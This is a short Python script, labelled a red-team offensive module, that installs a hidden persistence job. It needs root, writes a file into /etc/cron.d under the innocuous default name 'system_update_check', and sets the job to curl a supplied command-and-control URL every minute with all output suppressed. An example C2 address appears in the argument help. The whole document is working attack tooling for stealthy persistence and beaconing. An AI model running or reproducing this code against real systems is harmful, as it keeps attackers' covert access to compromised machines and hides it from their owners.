#!/usr/bin/env python3
"""
L4/L7 Offensive Module: Cron Persistence Installer.
Deploys a hidden scheduled task in the system cron directory (/etc/cron.d/)
that acts as a C2 beacon or reverse shell trigger.

Author: 18ilya99
Role: Security Researcher / Red Team Engineer
"""

import os
import argparse
import sys

def install_persistence(c2_url: str, job_name: str) -> None:
    """
    Writes a malicious cron job to the system cron.d directory.
    """
    print(f"[*] Initializing Cron Persistence module...")
    
    if os.getuid() != 0:
        print("[-] Permission Denied: Root privileges are required to write to /etc/cron.d/")
        sys.exit(1)

    cron_path = f"/etc/cron.d/{job_name}"
    # Standard curl beacon, piping output to dev/null for stealth
    beacon_command = f"* * * * * root curl -s {c2_url} > /dev/null 2>&1\n"

    try:
        with open(cron_path, "w", encoding='utf-8') as cron_file:
            cron_file.write(beacon_command)
        
        # System cron requires strict 644 permissions, otherwise it ignores the file
        os.chmod(cron_path, 0o644)
        
        print(f"[+] Persistence established successfully: {cron_path}")
        print(f"[+] Malicious Payload: {beacon_command.strip()}")

    except Exception as e:
        print(f"[-] Failed to establish persistence: {e}")
        sys.exit(1)

def main() -> None:
    parser = argparse.ArgumentParser(description="Advanced Cron Persistence Injector")
    parser.add_argument("-u", "--url", required=True, type=str, help="C2 Server URL for the beacon (e.g., http://10.0.0.5:4444/beacon)")
    parser.add_argument("-n", "--name", type=str, default="system_update_check", help="Name of the cron job file (Default: system_update_check)")
    args = parser.parse_args()

    install_persistence(args.url, args.name)

if __name__ == "__main__":
    main()